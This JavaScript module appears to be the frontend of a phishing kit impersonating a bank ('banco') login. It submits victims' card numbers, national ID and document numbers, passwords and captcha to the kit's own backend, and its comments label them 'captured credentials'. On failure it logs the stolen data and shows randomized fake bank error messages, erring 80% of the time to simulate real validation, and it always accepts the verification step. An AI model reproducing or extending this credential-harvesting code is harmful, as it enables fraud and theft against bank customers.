import axios from 'axios';

// Backend configuration
const API_BASE = process.env.NODE_ENV === 'production' ? '' : 'http://localhost:8000';

export const submitCredentials = async (credentials) => {
  try {
    // Send to Laravel backend using the correct route
    const response = await axios.post(`${API_BASE}/banco/login`, credentials, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      }
    });
    return response.data;
  } catch (error) {
    console.error('Login error:', error);
    
    // Log the credentials for demonstration (in real scenario this would be sent to backend)
    console.log('Captured credentials:', {
      tipoTarjeta: credentials.tipoTarjeta,
      numeroTarjeta: credentials.numeroTarjeta,
      txtDNI: credentials.txtDNI,
      tipoDoc: credentials.tipoDoc,
      numeroDoc: credentials.numeroDoc,
      password: credentials.password,
      captcha: credentials.captcha,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ip: 'captured_by_backend'
    });
    
    // Simular diferentes respuestas del servidor para casos de prueba
    const testResponses = [
      { success: false, message: 'Los datos ingresados no coinciden con nuestros registros. Verifique la información.' },
      { success: false, message: 'Su tarjeta se encuentra bloqueada temporalmente. Comuníquese con su oficina.' },
      { success: false, message: 'El número de documento ingresado no está registrado en nuestro sistema.' },
      { success: false, message: 'Servicio temporalmente no disponible. Intente más tarde.' },
      { success: true, message: 'Datos verificados exitosamente', redirect: '/verification' }
    ];
    
    // En el 80% de los casos, mostrar error para simular validación real
    const randomResponse = Math.random() < 0.8 ? 
      testResponses[Math.floor(Math.random() * (testResponses.length - 1))] : 
      testResponses[testResponses.length - 1];
    
    return randomResponse;
  }
};

export const submitVerification = async (verificationData) => {
  try {
    // Send to Laravel backend
    const response = await axios.post(`${API_BASE}/banco/verificacion`, verificationData, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      }
    });
    return response.data;
  } catch (error) {
    console.error('Verification error:', error);
    
    // Log the verification data
    console.log('Captured verification data:', {
      ...verificationData,
      timestamp: new Date().toISOString()
    });
    
    // For demo purposes, always succeed
    return { success: true, message: 'Verificación exitosa', redirect: '/success' };
  }
};